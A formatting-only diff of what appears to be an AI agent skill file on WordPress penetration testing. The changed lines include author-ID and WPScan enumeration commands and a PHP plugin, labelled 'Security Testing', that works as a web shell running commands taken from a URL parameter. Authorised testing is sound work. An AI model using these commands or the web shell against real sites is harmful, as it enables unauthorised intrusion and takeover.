@@ -2,8 +2,8 @@
 name: WordPress Penetration Testing
 description: This skill should be used when the user asks to "pentest WordPress sites", "scan WordPress for vulnerabilities", "enumerate WordPress users, themes, or plugins", "exploit WordPress vulnerabilities", or "use WPScan". It provides comprehensive WordPress security assessment methodologies.
 metadata:
-  author: zebbern
-  version: "1.1"
+ author: zebbern
+ version: "1.1"
 ---
 
 # WordPress Penetration Testing
@@ -195,7 +195,7 @@ wpscan --url http://target.com -e u1-100
 
 # Author ID enumeration (manual)
 for i in {1..20}; do
-    curl -s "http://target.com/?author=$i" | grep -o 'author/[^/]*/'
+ curl -s "http://target.com/?author=$i" | grep -o 'author/[^/]*/'
 done
 
 # JSON API user enumeration (if enabled)
@@ -224,14 +224,14 @@ wpscan --url http://target.com -e vp,vt,u,cb,dbe
 # vt - Vulnerable themes
 # ap - All plugins
 # vp - Vulnerable plugins
-# u  - Users (1-10)
+# u - Users (1-10)
 # cb - Config backups
 # dbe - Database exports
 
 # Full aggressive enumeration
 wpscan --url http://target.com -e at,ap,u,cb,dbe \
-    --detection-mode aggressive \
-    --plugins-detection aggressive
+ --detection-mode aggressive \
+ --plugins-detection aggressive
 ```
 
 ### Phase 8: Password Attacks
@@ -329,7 +329,7 @@ Description: Security Testing
 Version: 1.0
 */
 if(isset($_GET['cmd'])){
-    system($_GET['cmd']);
+ system($_GET['cmd']);
 }
 ?>
 EOF
